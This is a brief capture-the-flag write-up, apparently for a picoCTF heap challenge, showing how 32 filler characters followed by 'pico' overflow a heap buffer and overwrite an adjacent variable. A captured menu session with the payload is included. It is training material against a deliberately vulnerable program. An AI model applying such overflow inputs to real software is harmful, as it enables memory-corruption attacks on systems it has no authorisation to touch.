## Solution

From Previous Heap0 We know there is a heap exploit here. But in this challenge we need to write on heap but with the value of `pico` to get the flag

So we send 32 characters of anything and then pico to get the flag.

```bash
1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2 
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = pico
